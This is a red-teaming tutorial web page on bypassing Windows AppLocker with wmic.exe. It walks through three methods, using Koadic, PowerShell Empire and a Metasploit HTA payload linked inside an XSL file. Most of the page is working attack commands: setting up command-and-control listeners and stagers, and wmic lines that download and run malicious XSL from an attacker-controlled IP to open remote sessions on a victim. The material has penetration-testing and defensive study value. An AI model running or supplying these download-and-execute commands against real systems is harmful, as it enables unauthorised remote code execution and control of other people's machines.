<style>:root{--bg-color:#121212;--text-color:#ffffff;--accent-red:#ff4d4d;--accent-purple:#bb86fc;--secondary-color:#03dac6;--card-bg:#1e1e1e;--code-bg:#2d2d2d;--border-color:#333}body{background-color:var(--bg-color);color:var(--text-color);font-family:"Segoe UI",Roboto,Oxygen,Ubuntu,Cantarell,"Open Sans","Helvetica Neue",sans-serif;line-height:1.6;margin:0;padding:20px;max-width:1200px;margin:0 auto}.post-content{background-color:var(--card-bg);border-radius:8px;padding:30px;box-shadow:0 4px 6px rgba(0,0,0,0.3);margin-bottom:30px;color:var(--text-color) !important}h1,h2,h3,h4{color:var(--accent-purple);margin-top:1.5em}h3 span{color:var(--accent-red) !important}a{color:var(--secondary-color);text-decoration:none}a:hover{text-decoration:underline}pre,code{background-color:var(--code-bg);border-radius:4px;padding:2px 4px;font-family:Consolas,Monaco,"Andale Mono",monospace;color:#f8f8f2}pre{overflow-x:auto;padding:15px;border-left:3px solid var(--accent-purple)}img{max-width:100%;height:auto;display:block;margin:20px auto;border:1px solid var(--border-color)}ul,ol{padding-left:20px}li{margin-bottom:8px}.post-date,.post-cats{color:#aaa;font-size:0.9em;margin-bottom:20px}span,p{color:inherit !important}span[style*="color: #800000"]{color:var(--accent-red) !important}</style>
<div class="post-content">
            <div class="post-cats">
                <span class="cat-links"><a href="https://www.hackingarticles.in/category/red-teaming/" rel="category tag">Red Teaming</a>, <a href="https://www.hackingarticles.in/category/red-teaming/windows-exploitation/" rel="category tag">Windows Exploitation</a></span>            </div>
            <h1 class="post-title entry-title">Windows Exploitation: wmic</h1>            <div class="post-date">
                                    <div class="entry-meta">
                        <span class="posted-on"><a href="https://www.hackingarticles.in/windows-exploitation-wmic/" rel="bookmark"><time class="entry-date published" datetime="2019-01-23T08:31:05+00:00">January 23, 2019</time><time class="updated" datetime="2025-06-19T21:22:54+00:00">June 19, 2025</time></a></span><span class="post_by"> by <span class="author vcard"><a class="url fn n" href="https://www.hackingarticles.in/author/raj/">Raj</a></span></span>                    </div><!-- .entry-meta -->
                            </div>

            <div class="content post-excerpt entry-content clearfix">
                <p><span style="color: #000000;">The purpose of this post is to demonstrate the most common and familiar techniques of whitelisting AppLocker bypass. As we know for security reasons, the system admin adds group policies to restrict application execution for local users. In our previous article, we had discussed on “<span style="color: #3366ff;"><a style="color: #3366ff;" href="https://www.hackingarticles.in/windows-applocker-policy-a-beginners-guide/">Windows Applocker Policy – A Beginner’s Guide</a></span>” as they define the AppLocker rules for your application control policies and how to work with them. But today you will learn how to bypass Applocker policies using wmic.exe.</span></p>
<h3><span style="color: #800000;">Table of Content</span></h3>
<p><span style="color: #000000;"><strong>Introduction to Wmic.exe</strong></span></p>
<p><span style="color: #000000;"><strong>Exploiting Techniques</strong></span></p>
<ul>
<li><span style="color: #000000;">Koadic</span></li>
<li><span style="color: #000000;">Powershell Empire</span></li>
<li><span style="color: #000000;">Link hta within XSL code</span></li>
</ul>
<h3><span style="color: #800000;">Wmic.exe</span></h3>
<p><span style="color: #000000;">Microsoft created the WMIC utility, a tool that provides a WMI command-line interface for various administrative functions on local and remote machines, allowing users to perform wmic queries such as managing system settings, stopping processes, and running scripts locally or remotely. Therefore, it can invoke the XSL script (eXtensible Stylesheet Language).</span></p>
<h3><span style="color: #800000;">Exploiting Techniques</span></h3>
<h4><span style="color: #000000;">Koadic</span></h4>
<p><span style="color: #000000;">We will generate a malicious XSL file with the help of koadic which is a Command &amp; Control tool that is quite similar to the Metasploit and Powershell Empire.</span></p>
<p><span style="color: #000000;">To know how koadic works, read our article from here<em>: <span style="color: #3366ff;"><a style="color: #3366ff;" href="https://www.hackingarticles.in/koadic-com-command-control-framework/">https://www.hackingarticles.in/koadic-com-command-control-framework/</a></span></em></span></p>
<p><span style="color: #000000;">Once you complete the installation, you can run the <strong>./koadic</strong> file to start koadic and load the stager/js/wmic stager by executing the following command and set SRVHOST where the stager should call home.</span></p>
<pre class="EnlighterJSRAW" data-enlighter-language="generic">use stager/js/wmic
set SRVHOST 192.168.1.107
run</pre>
<p><span style="color: #000000;"><img fetchpriority="high" decoding="async" class="alignnone" src="//2.bp.blogspot.com/-DL2DWjnymAE/XEgkOvUDZVI/AAAAAAAAcS4/-x5a3Dqh7bQgGO-y1VCZKjStyat829VRwCLcBGAs/s1600/5.png" alt="Windows Exploitation: wmic" width="732" height="133"/></span></p>
<p><span style="color: #000000;">Execute WMIC following command to download and run the malicious XSL file from a remote server:</span></p>
<pre class="EnlighterJSRAW" data-enlighter-language="generic">wmic os get /FORMAT:"http://192.168.1.107:9996/g8gkv.xsl"</pre>
<p><span style="color: #000000;"><img decoding="async" src="//1.bp.blogspot.com/-zOrdHjAIQpY/XEgkOr0POjI/AAAAAAAAcS8/lcT5Q6dw66wga7RHvtExfa_fiB7cGk8qwCLcBGAs/s1600/6.png"/></span></p>
<p><span style="color: #000000;">Once the malicious XSL file will get executed on the target machine, you will have a Zombie connection just like Metasploit.</span></p>
<p><span style="color: #000000;"><img decoding="async" class="alignnone" src="//3.bp.blogspot.com/-zTKjJ-fQ_f8/XEgkPKPrItI/AAAAAAAAcTA/9x5Ev-VQYMQYHfCW49DSEdgxJS6eVgbmACLcBGAs/s1600/7.png" alt="Windows Exploitation using WMIC" width="860" height="454"/></span></p>
<h4><span style="color: #000000;">PowerShell Empire</span></h4>
<p><span style="color: #000000;">For our next method of wmic Attack, we will use empire. Empire is a post-exploitation framework. Till now we have paired our xsl tacks with Metasploit but in this method, we will use empire framework. It’s solely a python-based PowerShell windows agent which make it quite useful. Empire is developed by @harmj0y, @sixdub, @enigma0x3, rvrsh3ll, @killswitch_gui, and @xorrior. You can download this framework from <span style="color: #0000ff;"><a style="color: #0000ff;" href="https://github.com/BC-SECURITY/Empire"><strong>Here</strong></a></span></span></p>
<p><span style="color: #000000;">To have a basic guide of Empire, please visit our article introducing empire:</span></p>
<p><span style="color: #3366ff;"><a style="color: #3366ff;" href="https://www.hackingarticles.in/hacking-with-empire-powershell-post-exploitation-agent/">https://www.hackingarticles.in/hacking-with-empire-powershell-post-exploitation-agent/</a></span></p>
<p><span style="color: #000000;">Once the empire framework is started, type <strong>listener</strong> to check if there are any active listeners. As you can see in the image below that there are no active listeners. So to set up a listener type :</span></p>
<pre class="EnlighterJSRAW" data-enlighter-language="generic">listeners
uselistner http
set Host http://192.168.1.107
execute</pre>
<p><span style="color: #000000;">With the above commands, you will have an active listener. <strong>Type back</strong> to go out of listener so that you can initiate your PowerShell.</span></p>
<p><span style="color: #000000;">For our wmic attack, we will use a stager.  In the empire, a snippet of code acts as a stager that allows the agent to run our malicious code on the compromised host. So, for this type:</span></p>
<pre class="EnlighterJSRAW" data-enlighter-language="generic">usestager windows/launcher_xsl
set Listener http
execute</pre>
<p><span style="color: #000000;">Usestager will create a malicious code file that will be saved in the /tmp named launcher.xsl.</span></p>
<p><span style="color: #000000;"><img decoding="async" src="//2.bp.blogspot.com/-DFvAX4gXMww/XEgkPUwvZlI/AAAAAAAAcTE/k-JRssItrT4bEJxtDzxjhaBo-0kM6CGUQCLcBGAs/s1600/8.png"/></span></p>
<p><span style="color: #000000;">We have use python HTTP server to transfer this file inside victim’s machine</span></p>
<p><span style="color: #000000;"><img decoding="async" class="alignnone" src="//2.bp.blogspot.com/-J9l2Uz5gAQQ/XEgkPzX2uQI/AAAAAAAAcTI/tGAf8EvE3rsCYiCkds3OPqh9bbxGQuj6QCLcBGAs/s1600/9.png" alt="Windows Exploitation using WMIC" width="501" height="148"/></span></p>
<p><span style="color: #000000;">And once the file runs, we will have the result on our listener. Run the file in your victim’s machine by typing the following command:</span></p>
<pre class="EnlighterJSRAW" data-enlighter-language="generic">wmic process get brief /format:"http://192.168.1.107:8080/launcher.xsl"</pre>
<p><span style="color: #000000;"><img decoding="async" src="//4.bp.blogspot.com/-6jh68A-F-i8/XEgkNiFjcCI/AAAAAAAAcSk/LGkhE2Qgqo8zZaDQ0wX39pQL12DLa5IGgCLcBGAs/s1600/10.png"/></span></p>
<p><span style="color: #000000;">To see if we have any session open type ‘agents’. Doing so will show you the name of the session you have. To access that session type :</span></p>
<pre class="EnlighterJSRAW" data-enlighter-language="generic">interact Z639YHPA
sysinfo</pre>
<p><span style="color: #000000;"><img decoding="async" src="//1.bp.blogspot.com/-K1sg9_cY4hY/XEgkNurB08I/AAAAAAAAcSg/CpSVdA99mMQefebnqeC0C0sMlZkBy8XSQCLcBGAs/s1600/11.png"/></span></p>
<h4><span style="color: #000000;">Link hta within XSL code</span></h4>
<p><span style="color: #000000;">As we know, wmic can execute any file or script remotely, so we will link an hta file within the XSL code. An XSL file will include a link that downloads and executes a malicious hta file via mshta.exe, which wmic officially triggers.</span></p>
<p><span style="color: #000000;">Therefore, let’s generate an hta file with the help of Metasploit:</span></p>
<pre class="EnlighterJSRAW" data-enlighter-language="generic">use exploit/windows/misc/hta_server
msf exploit(windows/misc/hta_server) &gt; set srvhost 192.168.1.109
msf exploit(windows/misc/hta_server) &gt; exploit</pre>
<p><span style="color: #000000;">Now copy the URL and place it inside the XSL code, because they have the ability to execute the language script of Microsoft.</span></p>
<p><span style="color: #000000;"><img loading="lazy" decoding="async" class="alignnone" src="//3.bp.blogspot.com/-T0hISgjWwv0/XEgkNncW7pI/AAAAAAAAcSo/f2IWpNyi3QM2n6EX45OWh1FnbsImaPQgwCLcBGAs/s1600/12.png" alt="Windows Exploitation using WMIC" width="626" height="168"/></span></p>
<p><span style="color: #000000;">Then, we have created a “payload.xsl “file, you can take help from this <span style="color: #0000ff;"><strong>link</strong> </span>for writing XSL code and then place the link of hta file as shown below.</span></p>
<p><span style="color: #000000;"><img decoding="async" src="//2.bp.blogspot.com/-GefOus9S94I/XEgkOJnFDhI/AAAAAAAAcSs/Xfu0-q_z7h8UeBGhx8_XthOTgQp2UhXgACLcBGAs/s1600/13.png"/></span></p>
<p><span style="color: #000000;">Now again we need to execute XSL file through wmic.exe with the help of the following command:</span></p>
<pre class="EnlighterJSRAW" data-enlighter-language="generic">wmic os get /FORMAT:"http://192.168.1.109/payload.xsl"</pre>
<p><span style="color: #000000;"><img loading="lazy" decoding="async" class="alignnone" src="//3.bp.blogspot.com/-Z0v1-GnSh9E/XEgkOS1ufWI/AAAAAAAAcSw/pbQoyjAM3fIREuW3qy6VD2Xm_AayyVNjACLcBGAs/s1600/14.png" alt="Windows Exploitation: wmic" width="577" height="105"/></span></p>
<p><span style="color: #000000;">Once the above command is executed you will have a session open. To access the session, type:</span></p>
<pre class="EnlighterJSRAW" data-enlighter-language="generic">sessions 1</pre>
<p><span style="color: #000000;"><img loading="lazy" decoding="async" class="alignnone" src="//2.bp.blogspot.com/-LcU4UKt8AME/XEgkOvg1YjI/AAAAAAAAcS0/NO9XqsCmSjsDp1-EonAzb6GH1ZhKy3vzgCLcBGAs/s1600/15.png" alt="Windows Exploitation using WMIC" width="827" height="291"/></span></p>
<p><span style="color: #000000;"><strong>Author: </strong>Aarti Singh is a Researcher and Technical Writer at Hacking Articles an Information Security Consultant Social Media Lover and Gadgets. Contact<strong><a style="color: #000000;" href="https://www.linkedin.com/in/aarti--singh/"> <span style="color: #0000ff;">here</span></a></strong></span></p>
<div class="yarpp yarpp-related yarpp-related-website yarpp-template-thumbnails">
